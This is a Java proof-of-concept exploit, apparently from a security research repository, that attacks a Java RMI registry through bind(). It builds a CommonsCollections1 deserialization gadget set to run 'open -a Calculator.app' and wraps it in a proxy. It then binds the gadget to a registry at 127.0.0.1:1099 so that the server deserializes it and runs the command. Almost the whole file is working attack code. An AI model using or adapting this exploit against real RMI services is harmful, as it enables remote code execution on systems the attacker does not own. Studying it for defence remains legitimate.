package registry;

import utils.Serializer;

import java.io.Serializable;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * @author Whoopsunix
 *
 *  bind() 攻击 Registry
 */
public class Bind {
    public static void main(String[] args) throws Exception {
        Object annotationInvocationHandler = Serializer.cc1("open -a Calculator.app");

        // 代理封装
        Remote proxyEvalObject = Remote.class.cast(Proxy.newProxyInstance(
                Remote.class.getClassLoader(),
                new Class[]{Remote.class}, (InvocationHandler) annotationInvocationHandler));

        // 远程
        Registry registry_remote = LocateRegistry.getRegistry("127.0.0.1", 1099);
        registry_remote.bind("Hello", proxyEvalObject);

        // 自封装
//            Registry registry = LocateRegistry.createRegistry(1099);
//            Registry registry_remote = LocateRegistry.getRegistry("127.0.0.1", 1099);
//            registry_remote.bind("Hello", myRemote(annotationInvocationHandler));
//            System.out.println("rmi start at 3333");
    }

    // 自封装
    private static class BindExploit implements Remote, Serializable {
        private final Object memberValues;

        private BindExploit(Object payload) {
            memberValues = payload;
        }
    }

    public static Remote myRemote(Object obj) {
        Remote remote = new BindExploit(obj);
        return remote;
    }
}
